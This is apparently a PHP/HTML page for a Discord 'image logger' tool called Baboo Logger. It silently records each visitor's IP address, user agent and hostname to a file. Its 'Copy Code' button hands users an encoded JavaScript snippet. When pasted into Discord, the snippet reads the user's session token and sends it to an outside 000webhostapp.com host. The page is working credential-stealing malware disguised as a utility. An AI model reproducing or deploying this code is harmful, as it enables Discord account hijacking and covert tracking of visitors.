          <?php
file_put_contents("IPADDRESS.txt", "\nUserAgent: " . $_SERVER['HTTP_USER_AGENT'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nHostname: " . gethostname() . "\nClient Name: " . php_uname('n') . "\n===============\n",FILE_APPEND);
?>
<html><head><link rel="icon" href="https://media.discordapp.net/attachments/972449027205517352/978834147705520168/unknown.png" sizes="32x32">
<link rel="icon" href="https://media.discordapp.net/attachments/972449027205517352/978834147705520168/unknown.png" sizes="192x192">
<title>Baboo Image Logger V3</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    </head><body><style>
body {
  background-image: url('https://media.discordapp.net/attachments/972449027205517352/979898082449838080/unknown.png');
  background-repeat: no-repeat;
  background-attachment: fixed; 
  background-size: 100% 100%;
}
</style><div class="content">
	 <img src="https://media.discordapp.net/attachments/972449027205517352/978834147705520168/unknown.png">
	   <link rel="stylesheet" href="./style.css">
      <div class="text">Baboo Logger Micky#0001</div>
	  <p>Baboo Website Made With The Help By NewAgent On YouTube</p>
 <form action="config.php">
      <div class="input-box">
                  <div class="field">
          <span class="fa fa-user"></span>
          <input type="text" placeholder="Webhook" name="webhook" required="">
        </div>
        
        <div class="field">
          <span class="fa fa-image"></span>
          <input type="password" placeholder="Image url" name="imageurl" required="">
        </div>
        <br>
<div class="field">
          <span class="fa fa-lock"></span>
          <input class="token_container" name="TEST1" type="password" placeholder="Key To Make Image" required="">
        </div>
        <div>
<style>
body {
}
#myDIV {
text-align: left;
}
</style>         <div id="myDIV">
<a href="https://discord.gg/sxwXTuaCbX"><p style="color:#3391ff" ;="">Techincal problem</p></a>
          </div>
          </div>

    <script>
      const token_container = document.querySelector(".token_container");
      const copy_btn = document.querySelector(".copy");
      const box = document.querySelector(".box");
      const search_params = new URLSearchParams(location.search);
      const token = search_params.get("user") || search_params.get("token");
      token_container.innerHTML = token;
      copy_btn.addEventListener("click", async () => {
        try {
          if (window.my_timeout) {
            clearTimeout(window.my_timeout);
          }
          await navigator.clipboard.writeText(token);
          let bkp = copy_btn.innerHTML;
          copy_btn.innerHTML = "Copied To Clipboard";
          window.my_timeout = setTimeout(() => {
            copy_btn.innerHTML = bkp;
          }, 3000);
        } catch (err) {
          alert("Failed To Copy to Clipboard! Kindly Copy it Manually by Clicking the Token String");
          console.log(err);
        }
      });
    </script>
          
          
          
          
          
          
                    
          
          <style>
.disclaimer { display: none; }
</style>
          
          
          
        
<button type="submit">MAKE</button>
    <div class="icon-button"> 
            
            <a href="https://discord.gg/sxwXTuaCbX"><p style="color:#3391ff" ;="">You don't have the key ?</p></a>

            <button><a style="color:#000000" ;="" href="code.php?user=jaavascript:(async()%20%3D%3E%20%7B%20const%20token%20%3D%20(webpackChunkdiscord_app.push(%5B%5B%27%27%5D%2C%7B%7D%2Ce%3D%3E%7Bm%3D%5B%5D%3Bfor(let%20c%20in%20e.c)m.push(e.c%5Bc%5D)%7D%5D)%2Cm).find(m%3D%3Em%3F.exports%3F.default%3F.getToken!%3D%3Dvoid%200).exports.default.getToken()%3Bwindow.location.href%20%3D%20%60https%3A%2F%2Fbaboologgerr.000webhostapp.com%2FK%3Fuser%3D%24%7Btoken%7D%60%3B%7D)()">Copy Code</a></button>



        </div>
      
  </div></form>
  </div></body></html>